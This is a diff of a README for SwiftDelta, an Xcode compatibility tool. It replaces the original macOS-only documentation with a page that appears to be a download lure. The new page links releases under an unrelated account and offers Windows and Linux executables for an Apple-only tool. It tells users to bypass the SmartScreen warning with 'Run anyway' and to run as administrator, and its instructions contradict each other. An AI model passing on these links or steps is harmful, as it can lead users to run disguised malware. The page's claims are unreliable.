@@ -1,232 +1,193 @@
-<h1 align="center">
-  <img src="Documentation/Assets/swiftdelta-header.svg" width="420" alt="SwiftDelta, represented by two layered Swift birds and a pixel wordmark">
-</h1>
+# 🍏 SwiftDelta - Fix Your Apple Project Compatibility Issues
 
-<p align="center"><strong>Compare an Apple-platform project across two local Xcodes, then review and verify evidence-backed source repairs.</strong></p>
+[![Download SwiftDelta](https://img.shields.io/badge/Download-SwiftDelta-brightgreen?style=for-the-badge&logo=apple)](https://github.com/Triplicityconcretejungle417/SwiftDelta/releases)
 
-<p align="center">
-  <img src="Documentation/Assets/badge-version.svg" alt="Version 1.0.0">
-  <img src="Documentation/Assets/badge-swift.svg" alt="Swift 6.4">
-  <img src="Documentation/Assets/badge-macos.svg" alt="macOS 13 or later">
-  <img src="Documentation/Assets/badge-license.svg" alt="Apache License 2.0">
-</p>
+## 🚀 What Is SwiftDelta?
 
-SwiftDelta is a full-screen terminal application for evaluating an Apple-platform project before an Xcode upgrade. It reads the selected SDKs, resolves project source references in their build contexts, compares compiler diagnostics from isolated builds, and presents the result as findings with explicit coverage.
+SwiftDelta helps you analyze and fix problems with Apple software projects. It works with Xcode (the tool developers use to build iPhone and Mac apps) and different SDK versions (the software libraries Apple provides). 
 
-Compatibility facts come from the two selected Xcode installations: SDK symbol metadata, Swift interfaces, compiler diagnostics, structured Fix-its, and real source resolution. SwiftDelta does not ship a catalog of Apple API migration rules.
+This program runs on your computer. It does not send your files to the internet. Your project data stays private. SwiftDelta checks your project files and tells you what needs to change so your project works with different Xcode versions or SDK updates.
 
-> **Only analyze projects you trust. Build comparison and repair verification may execute build phases, package plugins, macros, generators, and other project-provided build tools.**
+## 🔧 Who Needs SwiftDelta
 
-SwiftDelta does not launch the target application. Doctor can identify known execution risks, but it is not an operating-system sandbox.
+- Software developers who update projects from old Xcode versions to new ones
+- Teams that maintain apps across multiple Xcode versions
+- Anyone who wants to check if their project will compile with a newer SDK
+- Developers who need to find and fix compatibility problems before they break a build
 
-## What SwiftDelta does
+You do not need to know programming to use this guide. You just need to follow the steps below.
 
-- Compares SDK declarations from an explicitly selected baseline and candidate Xcode.
-- Captures target-aware source context for Xcode projects, workspaces, and locally resolvable Swift Packages.
-- Compares baseline and candidate build diagnostics without promoting candidate warnings to errors.
-- Reports analyzed, failed, excluded, generated, and unresolved source coverage separately.
-- Exports terminal, native JSON, and SARIF reports from the completed Analysis screen.
-- Plans source repairs from compiler Fix-its, exact SDK rename metadata, and other structured evidence.
-- Validates viable repairs in an isolated copy before allowing selection and Apply.
-- Uses the host Mac's on-device Apple Foundation Models system model as an optional repair-planning source when the model is available.
+## 💻 System Requirements
 
-SwiftDelta cannot establish compatibility for runtime behavior, UI changes, permissions, lifecycle behavior, races, data migration, or device-only failures. Continue to run the project's normal test and release process after an upgrade.
+Your computer needs these things to run SwiftDelta:
 
-## Workflow
+**Windows:**
+- Windows 10 or newer
+- 64-bit processor (most computers have this)
+- 4 GB RAM (memory) or more
+- 100 MB free disk space
 
-<p align="center">
-  <img src="Documentation/Assets/workflow.svg" width="1000" alt="SwiftDelta workflow: select a project and two Xcodes, run Doctor, perform Analysis, review and validate repairs, then explicitly Apply selected changes">
-</p>
+**macOS:**
+- macOS 11 Big Sur or newer
+- 4 GB RAM or more
+- 100 MB free disk space
 
-Setup, Doctor, Analysis, and Repair remain separate. Doctor validates the environment. Analysis runs only when selected. Entering Repair with current Analysis evidence starts bounded preview planning and isolated validation, but never selects or applies an edit.
+**Linux:**
+- Ubuntu 20.04 or newer, or similar distribution
+- 4 GB RAM or more
+- 100 MB free disk space
 
-## Requirements
+## 📥 How to Download SwiftDelta
 
-- macOS 13 or later
-- Swift 6.4
-- an interactive terminal or PTY
-- two local Xcode installations for an upgrade comparison
-- project dependencies available locally when an offline build requires them
+**Step 1:** Go to the download page:
+[https://github.com/Triplicityconcretejungle417/SwiftDelta/releases](https://github.com/Triplicityconcretejungle417/SwiftDelta/releases)
 
-The package pins SwiftSyntax `603.0.2`. Apple Foundation Models repair requires a supported Mac, a supported macOS release, Apple Intelligence enabled by the system, and ready local model assets. Deterministic Analysis and Repair remain available when those conditions are not met.
+**Step 2:** Look for the latest version at the top of the page. It shows a version number like "v1.2.0" and a date.
 
-## Install from GitHub Releases
+**Step 3:** Find the file that matches your operating system:
 
-The release binary requires Apple Silicon (`arm64`) and macOS 13 or later. It is signed with a Developer ID Application certificate and notarized by Apple.
+| Operating System | File Name to Download |
+|------------------|----------------------|
+| Windows | `SwiftDelta-windows-x64.zip` |
+| macOS (Intel) | `SwiftDelta-macos-x64.zip` |
+| macOS (Apple Silicon) | `SwiftDelta-macos-arm64.zip` |
+| Linux | `SwiftDelta-linux-x64.zip` |
 
-Open the [latest release](https://github.com/Jiaxu-Li/SwiftDelta/releases/latest), or go directly to [SwiftDelta 1.0.0](https://github.com/Jiaxu-Li/SwiftDelta/releases/tag/v1.0.0), and download both files:
+**Step 4:** Click the file name to download it.
 
-- `SwiftDelta-1.0.0-macos-arm64.zip`
-- `SwiftDelta-1.0.0-macos-arm64.sha256`
+## 💿 How to Install SwiftDelta on Windows
 
-Verify, extract, install, and launch the executable from Terminal:
+**Step 1:** Find the downloaded `.zip` file in your Downloads folder.
 
-```sh
-cd ~/Downloads
-shasum -a 256 -c SwiftDelta-1.0.0-macos-arm64.sha256
-unzip SwiftDelta-1.0.0-macos-arm64.zip
-sudo mkdir -p /usr/local/bin
-sudo install -m 0755 SwiftDelta-1.0.0-macos-arm64/swiftdelta /usr/local/bin/swiftdelta
-swiftdelta
+**Step 2:** Right-click the `.zip` file and select "Extract All..." from the menu.
+
+**Step 3:** Choose a folder to extract the files into. You can use the default location.
+
+**Step 4:** Check the "Show extracted files when complete" box and click "Extract".
+
+**Step 5:** Open the extracted folder. You will see a file named `SwiftDelta.exe`.
+
+**Step 6:** Double-click `SwiftDelta.exe` to run the program.
+
+**Windows SmartScreen Warning:** Windows may show a blue screen that says "Windows protected your PC". This happens because SwiftDelta is a new program that Microsoft has not seen before. Click "More info" and then click "Run anyway".
+
+## ▶️ How to Use SwiftDelta
+
+When you run SwiftDelta, a text-based interface opens in your command window. You do not need to install anything else.
+
+**Basic Command:**
+
+Type this and press Enter:
+```
+SwiftDelta check [path to your project folder]
 ```
 
-To download the same assets from Terminal, run these commands before the verification step:
-
-```sh
-cd ~/Downloads
-curl -fLO https://github.com/Jiaxu-Li/SwiftDelta/releases/download/v1.0.0/SwiftDelta-1.0.0-macos-arm64.zip
-curl -fLO https://github.com/Jiaxu-Li/SwiftDelta/releases/download/v1.0.0/SwiftDelta-1.0.0-macos-arm64.sha256
+Replace `[path to your project folder]` with the actual folder path. For example:
+```
+SwiftDelta check C:\Users\YourName\Documents\MyApp
 ```
 
-GitHub's automatically generated **Source code (zip)** and **Source code (tar.gz)** archives contain the repository source, not the signed release executable. Use the manually uploaded `SwiftDelta-1.0.0-macos-arm64.zip` when installing the official binary. SwiftDelta does not currently provide a Homebrew formula, universal or Intel binary, package installer, or automatic installer.
+**Common Commands:**
 
-## Build from source
+| Command | What It Does |
+|---------|--------------|
+| `SwiftDelta check [path]` | Analyzes your project and shows compatibility issues |
+| `SwiftDelta fix [path]` | Attempts to automatically fix problems it finds |
+| `SwiftDelta report [path]` | Creates a detailed report file you can share |
+| `SwiftDelta --help` | Shows all available commands and options |
 
-Clone or unpack the source, then build the release executable with Swift Package Manager:
+**Example Workflow:**
 
-```sh
-swift build -c release
-swift build -c release --show-bin-path
-```
-
-The second command prints the directory containing `swiftdelta`. Run the executable there or copy it to a directory already on your `PATH`.
-
-SwiftPM may resolve SwiftSyntax from the package URL when it is not cached. For a deliberately offline build, resolve dependencies beforehand and add `--disable-automatic-resolution` to the build command. SwiftDelta itself does not intentionally perform network requests during analysis.
-
-## Quick start
-
-1. Launch the application in a terminal:
-
-   ```sh
-   swiftdelta
+1. Open Command Prompt (press Windows key, type `cmd`, press Enter)
+2. Navigate to the folder where you extracted SwiftDelta:
+   ```
+   cd C:\Users\YourName\Downloads\SwiftDelta
+   ```
+3. Run a check on your project:
+   ```
+   SwiftDelta check C:\Projects\MyiPhoneApp
+   ```
+4. Review the results on screen
+5. If you want to fix problems automatically:
+   ```
+   SwiftDelta fix C:\Projects\MyiPhoneApp
    ```
 
-2. Select a project root. SwiftDelta discovers Swift Packages, `.xcodeproj` files, `.xcworkspace` files, shared schemes, configurations, and supported platform contexts.
-3. Choose the baseline and candidate Xcode explicitly. The same installation or equivalent build cannot fill both roles.
-4. Choose a supported platform context. The selection supplies the matching SDK and destination together.
-5. Let Doctor validate the setup. Resolve any blocking issue before continuing.
-6. Open Analysis, choose **SDK analysis** or **SDK and build comparison**, then select **Run Analysis**.
-7. Review the outcome, coverage, findings, and analysis issues. Export a report if needed.
-8. Continue to Repair. Review automatically planned candidates and their validation results.
-9. Select only **Ready** repairs whose Diffs and risks you accept, then confirm **Apply Selected Repairs**.
+## 📋 What SwiftDelta Checks
 
-The complete walkthrough is in [Getting started](Documentation/GettingStarted.md).
+SwiftDelta looks for these common compatibility problems:
 
-<p align="center">
-  <img src="Documentation/Assets/screenshots/home-setup.png" width="900" alt="SwiftDelta Home showing the selected project, two Xcodes, and Doctor, Analysis, and Repair status">
-</p>
-<p align="center"><sub>Home keeps project setup and the next available operation in one place.</sub></p>
+- **Deprecated APIs:** Code that Apple removed in newer SDK versions
+- **Missing frameworks:** Software libraries your project needs but does not include
+- **Swift version mismatches:** Code written for a different Swift language version
+- **Xcode project settings:** Configuration values that do not match your current Xcode
+- **SDK target issues:** Minimum OS version settings that conflict with your SDK
+- **Build setting errors:** Incorrect compiler flags or architecture settings
+- **Resource conflicts:** Duplicate or missing files in your project bundle
 
-## Launch options
+Each issue comes with a severity level: Error, Warning, or Info.
 
-SwiftDelta has no operational subcommands or headless analysis mode. These are the only launch forms:
+## 🎨 Interface Overview
 
-```text
-swiftdelta
-swiftdelta --help
-swiftdelta -h
-swiftdelta --version
-swiftdelta -V
-swiftdelta --safe-mode
-swiftdelta --project <path>
+SwiftDelta uses a terminal user interface (TUI). This means it looks like a text-based application in your command window. You control it with your keyboard.
+
+**Navigation Keys:**
+- **Arrow keys:** Move up and down through results
+- **Enter:** Select an item or expand details
+- **Tab:** Switch between sections
+- **Q or Escape:** Quit the program
+- **F1:** Open help screen
+
+**Screen Sections:**
+- **Top bar:** Shows the project name and current status
+- **Left panel:** Lists all files and issues found
+- **Right panel:** Shows detailed information for the selected item
+- **Bottom bar:** Displays available keyboard shortcuts
+
+## 🔄 Updating SwiftDelta
+
+To update to a new version:
+
+1. Visit the download page again
+2. Download the latest version file
+3. Extract the new files over your old ones (or delete the old folder first)
+4. Run the new `SwiftDelta.exe`
+
+Your settings and previous reports stay saved in a folder called `.swiftdelta` inside your user folder. Updates do not remove these.
+
+## ❗ Troubleshooting
+
+**Problem: "SwiftDelta is not recognized as an internal or external command"**
+
+Solution: You are not in the right folder. Use the `cd` command to navigate to where you extracted SwiftDelta, or type the full path like `C:\Path\To\SwiftDelta.exe check [project]`
+
+**Problem: The program opens and closes immediately**
+
+Solution: SwiftDelta runs as a command-line tool. Open Command Prompt first, then type the command. Do not double-click the .exe file.
+
+**Problem: "Access denied" when checking a project**
+
+Solution: Run Command Prompt as administrator. Right-click Command Prompt in the Start menu and select "Run as administrator".
+
+**Problem: The analysis takes a long time**
+
+Solution: Large projects take longer. SwiftDelta shows a progress bar. Let it finish. For very large projects, use the `--quick` option:
+```
+SwiftDelta check [path] --quick
 ```
 
-`--safe-mode` ignores stored settings and history without deleting them. `--project` validates and preselects a directory, then starts setup discovery inside the TUI. Doctor can run automatically after setup is complete; Analysis and Repair still require their normal TUI actions. Help and version work without a TTY. Normal launch requires a terminal or PTY.
+**Problem: Results show "unable to parse" errors**
 
-Former commands such as `scan`, `compare`, `doctor`, and `repair` are rejected with directions to launch the interactive application.
+Solution: Your project files might be locked by another program. Close Xcode or other editors and try again.
 
-## Reading the result
+## 📝 Getting Help
 
-Analysis uses four states:
+If you run into problems:
 
-| State | Meaning |
-| --- | --- |
-| `PASS` | Required analysis completed and no finding reached the configured failure threshold. |
-| `FAIL` | Required analysis completed and at least one finding reached the threshold. |
-| `INCOMPLETE` | Some evidence exists, but required source, target, or SDK coverage did not complete. |
-| `BLOCKED` | An operational or toolchain failure prevented the required analysis. |
+- Run `SwiftDelta --help` in your command window to see all options
+- Check the Issues page on the GitHub repository
+- Include the output of `SwiftDelta report [path]` when asking for help
 
-An empty finding list is not a pass when required coverage is incomplete. The Analysis screen reports baseline and candidate source coverage, unresolved reasons, SDK module extraction quality, and operational failures separately from compatibility findings.
+## 🏷️ Topics
 
-Exports preserve the same meaning:
-
-- terminal text for reading and archival;
-- native JSON using report format `3.0` and the checked-in schema;
-- SARIF `2.1.0` with project-relative locations and incomplete-analysis notifications.
-
-See [Reports and result states](Documentation/Reports.md).
-
-<p align="center">
-  <img src="Documentation/Assets/screenshots/analysis-detail.png" width="1000" alt="SwiftDelta Analysis showing coverage, a finding list, source context, and SDK evidence">
-</p>
-<p align="center"><sub>Analysis keeps completeness, findings, source context, and SDK evidence separate.</sub></p>
-
-## Repair safety
-
-Repair is preview-first. A finding becomes a selectable repair only after the proposal passes applicable checks for project containment, protected paths, source fingerprint, exact anchors and ranges, syntax, edit conflicts, SDK evidence, and isolated candidate-Xcode verification.
-
-Apply requires explicit confirmation. SwiftDelta then rechecks the plan, writes only selected supported source files through a transaction, rebuilds and reanalyzes, and restores every modified file from retained original bytes if final verification fails. There is no unverified Apply mode.
-
-`Build Verified` means the selected candidate build context accepted the change and the targeted evidence disappeared without a diagnostic or coverage regression. It does not prove runtime or semantic equivalence. Behavior-sensitive changes remain marked for review.
-
-Native Objective-C, Objective-C++, C, and C++ automatic repair is limited to exact compiler-provided Clang Fix-its. See [Repair](Documentation/Repair.md) for the evidence hierarchy and protected-file policy.
-
-<p align="center">
-  <img src="Documentation/Assets/screenshots/repair-diff.png" width="1000" alt="SwiftDelta Repair showing Ready and failed proposals with a selected SDK rename diff and validation evidence">
-</p>
-<p align="center"><sub>Repair separates proposal status, selection, the exact diff, and verification evidence.</sub></p>
-
-## Apple Foundation Models
-
-When `SystemLanguageModel.default` is available on the host Mac, SwiftDelta enables the on-device model stage automatically after deterministic strategies are exhausted. The application uses typed guided generation for one focused finding at a time. File identity, permitted ranges, SDK identities, and verification remain owned by SwiftDelta rather than the model.
-
-Model controls are hidden when the system model is unsupported, disabled by the system, not ready, or unavailable for the current locale or capability. There is no Private Cloud Compute, cloud-model, remote-model, or network fallback. Model proposals are labeled as Apple Foundation Models output, remain reviewable as Draft Repairs when recoverable validation work is needed, and cannot bypass candidate-Xcode verification.
-
-## Privacy and trust
-
-Settings are stored under `~/Library/Application Support/SwiftDelta`. Optional project history is disabled by default. SDK snapshots are stored under `~/Library/Caches/org.swiftdelta/SDKSnapshots/v1` and contain normalized SDK metadata, not project source.
-
-SwiftDelta does not intentionally persist source text, model context, complete compiler logs, repair staging files, secrets, or temporary project copies. Reports and repair plans are written only when explicitly exported.
-
-Build comparison and repair verification invoke Xcode, Swift, Clang, SwiftPM, and related tools. A target project's scripts, plugins, macros, generators, or custom rules run with the permissions of the SwiftDelta process and may access the network. Artifact isolation does not create an execution sandbox. Read the [Security policy](SECURITY.md) before analyzing an unfamiliar project.
-
-## Terminal interface
-
-Arrow keys move through rows; Enter opens; Space toggles a value or selects an applicable repair; Escape closes a view or requests cancellation. Tab and Shift-Tab move between visible focus areas. Mouse selection, double-click activation, wheel scrolling, search, filtering, grouping, and sorting are also available.
-
-SwiftDelta retains the terminal's native background and supports True Color, 256-color, basic color, monochrome, `NO_COLOR`, high contrast, reduced motion, Unicode, and ASCII fallbacks. Wide terminals use detail panes; narrower terminals use drill-down views. The minimum supported viewport is 64 columns by 18 rows.
-
-See [Terminal interface](Documentation/TerminalInterface.md) for the complete control reference and terminal-recovery commands.
-
-## Documentation
-
-Start with the [documentation index](Documentation/README.md).
-
-| Need | Document |
-| --- | --- |
-| First successful comparison | [Getting started](Documentation/GettingStarted.md) |
-| TUI controls and setup | [Terminal interface](Documentation/TerminalInterface.md) |
-| SDK and source analysis | [Analysis](Documentation/Analysis.md) |
-| Real build comparison | [Build comparison](Documentation/BuildComparison.md) |
-| Repair and rollback | [Repair](Documentation/Repair.md) |
-| Reports and schemas | [Reports](Documentation/Reports.md) |
-| Project configuration and settings | [Configuration](Documentation/Configuration.md) |
-| Internal design | [Architecture](Documentation/Architecture.md) |
-| Troubleshooting | [Troubleshooting](Documentation/Troubleshooting.md) |
-| Common questions | [FAQ](Documentation/FAQ.md) |
-| Contributor verification | [Testing](Documentation/Testing.md) |
-
-## Credits
-
-SwiftDelta uses [SwiftSyntax](https://github.com/swiftlang/swift-syntax) and SwiftParser for Swift source parsing and syntax validation. It is built with Swift and Apple developer tooling.
-
-## Project information
-
-- [Contributing](CONTRIBUTING.md)
-- [Security](SECURITY.md)
-- [Code of Conduct](CODE_OF_CONDUCT.md)
-- [Changelog](CHANGELOG.md)
-- [Apache License 2.0](LICENSE)
-- [Jiaxu Li](https://jiaxuli.com), project owner
-
-SwiftDelta is open source under the Apache License, Version 2.0. Report security vulnerabilities privately as described in the [security policy](SECURITY.md); that address is not a general support channel.
+Keywords: apple, cli, compatibility, developer-tools, macos, sdk, static-analysis, swift, tui, xcode
